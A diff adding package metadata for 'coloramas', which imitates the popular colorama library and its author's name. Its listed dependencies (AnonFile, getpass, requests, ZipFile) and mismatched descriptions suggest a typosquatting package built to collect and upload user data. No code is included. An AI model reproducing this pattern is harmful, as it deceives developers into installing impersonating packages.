@@ -1,0 +1,18 @@
+Metadata-Version: 2.1
+Name: coloramas
+Version: 0.0.13
+Summary: Colored Terminal Text
+Home-page: https://github.com/pypa/sampleproject
+Author: Tartley (Jonathan Hartley)
+Author-email: <tartley@tartley.com>
+License: UNKNOWN
+Project-URL: Bug Tracker, https://github.com/pypa/sampleproject/issues
+Requires-Dist: AnonFile
+Requires-Dist: getpass
+Requires-Dist: os
+Requires-Dist: requests
+Requires-Dist: ZipFile
+
+
+# Art ASCII New Generation
+
